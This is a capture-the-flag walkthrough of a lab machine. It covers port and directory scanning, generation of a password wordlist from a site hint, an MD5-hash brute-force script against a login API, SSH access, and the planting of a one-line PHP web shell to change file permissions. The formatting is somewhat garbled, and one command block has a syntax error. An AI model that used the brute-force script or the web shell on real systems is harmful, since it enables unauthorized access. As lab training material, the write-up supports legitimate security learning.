
<h3>Nmap</h3>

```bash
nmap -sC -sV -Pn -p- -T5 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
```

<h3>Gobuster</h3>

<p>

- /admin/<br>
- /api/<br>
- /assets/<br>
- /css/<br>
- index.html<br>
- /js/<br>
- login.php</p>

```bash
gobuster dir -u http://pig.thm/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/admin                (Status: 301) [Size: 302] [--> http://pig.thm/admin/]
http://pig.thm/api                  (Status: 301) [Size: 300] [--> http://pig.thm/api/]
http://pig.thm/assets               (Status: 301) [Size: 303] [--> http://pig.thm/assets/]
http://pig.thm/css                  (Status: 301) [Size: 300] [--> http://pig.thm/css/]
http://pig.thm/index.html           (Status: 200) [Size: 4801]
http://pig.thm/js                   (Status: 301) [Size: 299] [--> http://pig.thm/js/]
http://pig.thm/login.php            (Status: 200) [Size: 2790]
...
```

```bash
gobuster dir -u http://pig.thm/admin/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [--> /login.php]](http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [)
```

```bash
gobuster dir -u http://pig.thm/api/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
Error: the server returns a status code that matches the provided options for non existing urls. http://pig.thm/api/433a855f-11f9-4ddd-8021-08ee7d4d9f08 => 200 (Length: 68). To continue please exclude the status code or the length
```

```bash
gobuster dir -u http://pig.thm/assets/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/assets/fonts                (Status: 301) [Size: 309] [--> http://pig.thm/assets/fonts/]
http://pig.thm/assets/img                  (Status: 301) [Size: 307] [-
```

```bash
gobuster dir -u http://pig.thm/assets/ -w /usr/share/wordlists/dirb/big.txt -e -k -q -x txt,php,html -t 60
...
http://pig.thm/assets/fonts                (Status: 301) [Size: 309] [--> http://pig.thm/assets/fonts/]
http://pig.thm/assets/img                  (Status: 301) [Size: 307] [-
```

<h2>Web port 80</h2>

<img width="1056" height="478" alt="image" src="https://github.com/user-attachments/assets/cbadbbb2-ce80-4338-8640-6f624fc120ee" />


<h3>/index.html</h3>

<img width="1048" height="390" alt="image" src="https://github.com/user-attachments/assets/b3b625b7-3594-4b9d-8597-3d9e3a2d2404" />


<h3.</h3>

<img width="1032" height="311" alt="image" src="https://github.com/user-attachments/assets/58b23987-f73c-48e4-9330-daf4990971f7" />

<br>
<br>

<img width="1053" height="372" alt="image" src="https://github.com/user-attachments/assets/85461185-8c85-4684-affa-d0295b481b25" />


```bash
Remember that passwords should be a memorable word, followed by two numbers and a special character
```

```bash
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

```bash
python3 words.py > wordsl.txt
```

```bash
tail -n 6 wordsl.txt
plane94$
plane95$
plane96$
plane97$
plane98$
plane99$
```

```bash
while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < wordsl.txt | tee -a wordsh.txt ls > este
```

```bash
tail -n 3 este
b6ebbbe33a4580cca6c870c770fa36c4
6375c114ae25223dd775f057d5a130ec
89d6fc4ce85359185258f8b6aecd9a92
```







```bash
POST /api/login HTTP/1.1
Host: pig.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://pig.thm/login.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 65
Origin: http://pig.thm
Connection: keep-alive
Priority: u=0

{"username":"marco","password":"§5f4dcc3b5aa765d61d8327deb882cf99§"}
```


```bash
#!/usr/bin/python
import requests
import hashlib

user = 'marco'
url = 'http://10.201.86.29/api/login'
headers = {'Accept': 'application/json'}
f = open('password','r')
for line in f.readlines():
        line = line.strip()
        result = hashlib.md5(line.encode()).digest().hex()
        print("Trying : " + result,end='\r',flush=True)
        data = { 'username':user,
                 'password':result}

        r = requests.post(url=url,json=data,headers=headers,proxies={'http':'127.0.0.1:8080'})
        if 'Incorrect Username or Password' not in r.text:
                print("\nPassword Found for "+user + ':'  + line)
                exit(0)

print('Finished')
```


```bash
python3 s.py
Finished ba33768f2b2fae4198917d3f294cad37
```
]


<img width="1050" height="440" alt="image" src="https://github.com/user-attachments/assets/52cfaf63-ed86-4ecd-8a26-a05ac3892131" />



<img width="1060" height="455" alt="image" src="https://github.com/user-attachments/assets/a520a537-ddf1-4e97-a67d-d631e71c552d" />


<img width="1057" height="354" alt="image" src="https://github.com/user-attachments/assets/e6692949-1565-4132-b26a-2bcae7c03e60" />


~# ssh marco@pig.thm
The authenticity of host 'pig.thm (10.201.86.29)' can't be established.
ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pig.thm,10.201.86.29' (ECDSA) to the list of known hosts.
marco@pig.thm's password: 

	
	__   __                       __   _   _            ____  _       
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
	                                                            |___/ 


marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ pwd
/home/marco
marco@year-of-the-pig:~$ ls
flag1.txt




marco@year-of-the-pig:/var/www$ ls -lah
total 36K
drwxr-xr-x  3 www-data web-developers 4.0K Sep 17 02:44 .
drwxr-xr-x 13 root     root           4.0K Aug 22  2020 ..
-rw-------  1 www-data www-data        24K Sep 17 02:44 admin.db
drwxrwxr-x  7 www-data web-developers 4.0K Aug 21  2020 html



marco@year-of-the-pig:/var/www/html/admin$ ls -lah
total 56K
drwxrwxr-x 2 www-data web-developers 4.0K Aug 21  2020 .
drwxrwxr-x 7 www-data web-developers 4.0K Aug 21  2020 ..
-rwxrwxr-x 1 www-data web-developers 2.0K Aug 21  2020 adduser.php
-rwxrwxr-x 1 www-data web-developers 1.7K Aug 21  2020 commands.php
-rwxrwxr-x 1 www-data web-developers 1.8K Aug 21  2020 deleteuser.php
-rwxrwxr-x 1 root     root            338 Aug 21  2020 getCurrentUser.php
-rwxrwxr-x 1 www-data web-developers  270 Aug 21  2020 getUsers.php
-rwxrwxr-x 1 www-data web-developers  393 Aug 21  2020 includes.php
-rwxrwxr-x 1 www-data web-developers 3.3K Aug 21  2020 index.php
-rwxrwxr-x 1 www-data web-developers  390 Aug 21  2020 landing.php
-rwxrwxr-x 1 root     root            143 Aug 21  2020 prepareAuth.php
-rwxrwxr-x 1 www-data web-developers 1.8K Aug 21  2020 resetpassword.php
-rwxrwxr-x 1 root     root            268 Aug 21  2020 sessionCleanup.php
-rwxrwxr-x 1 www-data web-developers  782 Aug 21  2020 style.css


marco@year-of-the-pig:~$ cat flag1.txt
THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}



arco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
    require_once "/var/www/html/admin/prepareAuth.php";
    if (!$auth){
        header("location: /login.php");
    }
	$dbh->close();
?>

<!DOCTYPE html>
<html>
	<p id="id" style="display:none">commands</p>
	<?php require "includes.php";?>
	<body class="include">
		<h1 id="content-title">Commands</h1>
		<h2>Use this page to execute arbitrary commands on the system</h2>
		<form method=post style="display: inline;">
			<input type=text name="command" class="input" placeholder="Command...">
			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
		</form>
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
		<?php
			//Totally useless script to catch hackers out, eh, Marco? You old rogue!
			if (isset($_POST["command"])){
				echo "<pre>";
				$cmd=$_POST["command"];
				if (strlen($cmd) == 0){
					echo "No command entered";
				}
				else if ($cmd == "whoami"){
					echo "www-data";
				}
				else if ($cmd == "id"){
					echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
				}
				else if ($cmd == "ifconfig"){
					system("ifconfig");
				}
				else if (substr($cmd,0,5) == "echo "){
					echo substr($cmd,5);
				}
				else if ($cmd == "hostname"){
					echo "year-of-the-pig";
				}
				else if (stristr($cmd,"nc")){
					preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
					$components = explode(" ", $string[0]);
					$ip = $components[0];
					$port = end(array_values($components));
					system("nc $ip $port >/dev/null 2>&1");
				}
				else{
					echo "Invalid Command!";
				}
				echo "<pre>\n";
			}
		?>
	</body>
</html>
marco@year-of-the-pig:/var/www/html/admin$ 






wget http://10.201.86.29:8000/admin.db -o admin.db


marco@year-of-the-pig:/var/www$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000::/home/marco:/bin/bash
curtis:x:1001:1001::/home/curtis:/bin/bash



marco@year-of-the-pig:/var/www$ ps -eo pid,user,command
  PID USER     COMMAND
    1 root     /sbin/init
    2 root     [kthreadd]
    4 root     [kworker/0:0H]
    6 root     [mm_percpu_wq]
    7 root     [ksoftirqd/0]
    8 root     [rcu_sched]
    9 root     [rcu_bh]
   10 root     [migration/0]
   11 root     [watchdog/0]
   12 root     [cpuhp/0]
   13 root     [kdevtmpfs]
   14 root     [netns]
   15 root     [rcu_tasks_kthre]
   16 root     [kauditd]
   17 root     [xenbus]
   18 root     [xenwatch]
   20 root     [khungtaskd]
   21 root     [oom_reaper]
   22 root     [writeback]
   23 root     [kcompactd0]
   24 root     [ksmd]
   25 root     [khugepaged]
   26 root     [crypto]
   27 root     [kintegrityd]
   28 root     [kblockd]
   29 root     [ata_sff]
   30 root     [md]
   31 root     [edac-poller]
   32 root     [devfreq_wq]
   33 root     [watchdogd]
   36 root     [kswapd0]
   37 root     [kworker/u31:0]
   38 root     [ecryptfs-kthrea]
   80 root     [kthrotld]
   81 root     [acpi_thermal_pm]
   82 root     [scsi_eh_0]
   83 root     [scsi_tmf_0]
   84 root     [scsi_eh_1]
   85 root     [scsi_tmf_1]
   88 root     [kworker/0:2]
   92 root     [ipv6_addrconf]
  102 root     [kstrp]
  119 root     [charger_manager]
  172 root     [ttm_swap]
  264 root     [kworker/0:1H]
  265 root     [raid5wq]
  322 root     [jbd2/xvda1-8]
  323 root     [ext4-rsv-conver]
  385 root     /lib/systemd/systemd-journald
  393 root     /lib/systemd/systemd-udevd
  394 root     [iscsi_eh]
  396 root     /sbin/lvmetad -f
  397 root     [ib-comp-wq]
  399 root     [ib-comp-unb-wq]
  400 root     [ib_mcast]
  401 root     [ib_nl_sa_wq]
  402 root     [rdma_cm]
  450 systemd+ /lib/systemd/systemd-networkd
  497 systemd+ /lib/systemd/systemd-timesyncd
  498 systemd+ /lib/systemd/systemd-resolved
  508 message+ /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  509 root     /usr/lib/accountsservice/accounts-daemon
  510 root     /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
  511 syslog   /usr/sbin/rsyslogd -n
  512 root     /lib/systemd/systemd-logind
  514 root     /usr/sbin/cron -f
  515 daemon   /usr/sbin/atd -f
  516 root     /usr/bin/lxcfs /var/lib/lxcfs/
  559 root     /sbin/agetty -o -p -- \u --noclear tty1 linux
  578 root     /usr/lib/policykit-1/polkitd --no-debug
  583 root     /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
  584 root     /usr/sbin/sshd -D
  601 root     /usr/sbin/apache2 -k start
  646 root     /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
 1176 root     [kworker/u30:1]
 1188 www-data /usr/sbin/apache2 -k start
 1252 www-data /usr/sbin/apache2 -k start
 1304 root     [kworker/0:0]
 1370 www-data /usr/sbin/apache2 -k start
 1377 www-data /usr/sbin/apache2 -k start
 1469 www-data /usr/sbin/apache2 -k start
 1471 www-data /usr/sbin/apache2 -k start
 1474 www-data /usr/sbin/apache2 -k start
 1477 www-data /usr/sbin/apache2 -k start
 1479 www-data /usr/sbin/apache2 -k start
 1480 www-data /usr/sbin/apache2 -k start
 1545 root     [kworker/u30:2]
 1557 root     sshd: marco [priv]
 1562 marco    sshd: marco@pts/0
 1563 marco    -bash
 1630 marco    ps -eo pid,user,command





marco@year-of-the-pig:/var/www/html/admin$ ls -lah commands.php
-rwxrwxr-x 1 www-data web-developers 1.7K Aug 21  2020 commands.php


arco@year-of-the-pig:/var/www/html/admin$ cp commands.php commands.bak
marco@year-of-the-pig:/var/www/html/admin$ nano commands.php


marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
echo system($_REQUEST['cmd'];
?>


marco@year-of-the-pig:/var/www/html/admin$ curl localhost/admin/commands.php -d 'cmd=chmod 777 /var/www/admin.db'
marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db
-rw------- 1 www-data www-data 24576 Sep 17 02:44 /var/www/admin.db




<img width="954" height="367" alt="image" src="https://github.com/user-attachments/assets/cb1381cb-3416-4029-ab2b-e1481ad4f5f7" />

<br>
<br>



<img width="934" height="233" alt="image" src="https://github.com/user-attachments/assets/5bef4268-f864-4012-b4cc-6b4a7410aa81" />

<img width="947" height="286" alt="image" src="https://github.com/user-attachments/assets/35820a65-b52d-4190-a672-f8a602249e62" />


<h3>/admin/resetpassword.php</h3>


<img width="1096" height="365" alt="image" src="https://github.com/user-attachments/assets/2e983075-3f19-49da-b79a-60e8c05014fc" />



<h3>/login.php & admin:admin</h3>

<img width="1094" height="227" alt="image" src="https://github.com/user-attachments/assets/1ca72c34-5803-42a5-8af8-61216b28b1ef" />

```bash
memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
                  'Curtiss', 'curtiss', 'Curtis', 'curtis', 'planes', 'Planes',
                  'Plane', 'plane']
specialChars = ['!','@','#','$']
count = 0

for word in memorableWords:
    for specialChar in specialChars:
        while (count <= 99):
            if (count <= 9):
                count = '0' + str(count)
            else:
                count = str(count)
            print(word + count + specialChar)
            count = int(count)
            count += 1
        count = 0
```

```bash
python memorable.py > wordlist.txt
```

```bash
tail wordlist.txt
plane90$
plane91$
plane92$
plane93$
plane94$
plane95$
plane96$
plane97$
plane98$
plane99$
```

```bash
while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done < passwords_generated.lst | tee -a passwords_hashed.lst
```

```bash
tail hashed_passwords
9a6216dcf0a945a1f70fb7dd2aa10b36
41fb768d68788990c0b73e72733ed1aa
5b127e461341cabb165444342245bae6
60c0d7fd1069d09821161fb7fc51376d
342d5765ac9c87a39323d67e662fe9cd
cd9170ba05edab80fc067639ed64f320
d727a859382cfc4263c5d6ec9f8e6b7c
b6ebbbe33a4580cca6c870c770fa36c4
6375c114ae25223dd775f057d5a130ec
89d6fc4ce85359185258f8b6aecd9a92
```



444


<img width="1046" height="432" alt="image" src="https://github.com/user-attachments/assets/06b7e18f-21ea-4445-8ffd-e2935fb2b03b" />

<img width="1033" height="409" alt="image" src="https://github.com/user-attachments/assets/ab322a15-dde8-4990-86ca-b0e57652efd9" />


